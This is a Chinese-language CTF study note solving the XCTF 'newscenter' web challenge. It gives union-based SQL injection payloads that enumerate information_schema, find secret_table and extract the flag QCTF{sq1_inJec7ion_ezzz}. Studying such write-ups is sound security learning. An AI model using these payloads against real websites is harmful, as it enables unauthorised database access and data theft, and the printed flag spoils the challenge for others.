---
typora-copy-images-to: ./images
typora-root-url: ../pengsj_notes
---

1. 题目：攻防世界web高手进阶区的newscenter题目：

   - 为什么要使用单引号`'`，为什么要使用`#`，联合查询的时候，直接select 1，2，3看结果回显哪一个？？为什么还要 0 union。

     `'and 0 union select 1,2,3 # `

     ![image-20210203205653243](images/image-20210203205653243.png)

     

   - 由于上面的查询语句得到的是2 3的结果，所以这题的思路就是在2 3位置输入查询的数据库名和表名。

     ````mysql
     ' and 0 union select 1, table_schema,table_name from information_schema.columns #
     ````

     ![image-20210203205912343](images/image-20210203205912343.png)

     ![image-20210203205929110](images/image-20210203205929110.png)

     由查询结果可知，数据库为news，表名为secret_table。

   - 这一步查询secret_table的字段名：

     ```mysql
     ' and 0 union select 1,2,column_name from information_schema.columns where table_name='secret_table' #
     ```

     ![image-20210203210237927](images/image-20210203210237927.png)

   - 由结果可得：

     结果在fl4g字段中：

     ![image-20210203210657111](images/image-20210203210657111.png)

     `QCTF{sq1_inJec7ion_ezzz} `

